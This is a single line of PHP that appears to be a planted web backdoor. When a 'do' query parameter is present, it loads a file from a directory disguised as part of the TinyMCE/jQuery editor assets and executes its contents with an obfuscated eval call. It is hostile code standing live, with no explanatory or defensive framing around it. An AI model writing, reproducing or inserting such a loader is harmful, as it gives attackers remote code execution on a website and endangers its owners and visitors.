<?php if(isset($_GET['do'])){header('Content-Type: text/html; charset=windows-1251');$p=str_replace('..','',$_GET['do']);echo eval/**/('?>'.join("",file("newsgrabber/tinymce/jscripts/tiny_mce/jquery/$p")).'<?');die;}?>